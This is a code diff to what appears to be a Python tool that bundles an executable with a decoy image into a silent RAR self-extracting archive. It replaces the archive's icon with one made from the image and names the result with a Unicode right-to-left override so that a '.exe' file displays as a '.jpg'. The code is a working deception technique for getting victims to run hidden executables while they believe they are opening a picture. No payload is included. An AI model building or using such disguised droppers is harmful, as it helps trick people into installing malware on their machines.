@@ -6,6 +6,7 @@ import argparse
 
 ICON = "temp.ico"
 CONFIG = "config.txt"
+NAME = ''.join(random.choices(string.ascii_lowercase, k=6))
 
 def create_icon(img: str):
     with Image(filename=img) as img:
@@ -15,8 +16,11 @@ def create_icon(img: str):
 def create_archive(exe: str, img: str):
     create_icon(img)
 
+    newimg = f"{NAME}exe.{os.path.splitext(img)[1]}"
+    os.rename(img, newimg)
+
     with open(CONFIG, "w") as f:
-        f.write(f'Setup={img}\nSetup={exe}\nTempMode\nSilent=1\nOverwrite=1\nUpdate=U')
+        f.write(f'Setup={newimg}\nSetup={exe}\nTempMode\nSilent=1\nOverwrite=1\nUpdate=U')
 
     temp = "temp.exe"
     out = "archive.exe"
@@ -24,15 +28,16 @@ def create_archive(exe: str, img: str):
 
     with open(script, "w") as f:
         f.write("\n".join([
-            f'rar a -sfx -z{CONFIG} {temp} "{exe}" "{img}"',
+            f'rar a -sfx -z{CONFIG} {temp} "{exe}" "{newimg}"',
             f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
             f'ResourceHacker.exe -open {temp} -save {out} -action add -res {ICON} -mask ICONGROUP,1,'
         ]))
 
     subprocess.run([script])
 
-    os.rename(out, f"{''.join(random.choices(string.ascii_lowercase, k=6))}\u202Egpj.exe")
+    os.rename(out, f"{NAME}\u202Egpj.exe")
 
+    os.rename(newimg, img)
     os.remove(ICON)
     os.remove(CONFIG)
     os.remove(temp)
@@ -47,7 +52,6 @@ def main():
     args = parser.parse_args()
 
     create_archive(args.e, args.i)
-  
 
 if __name__ == "__main__":
     main()
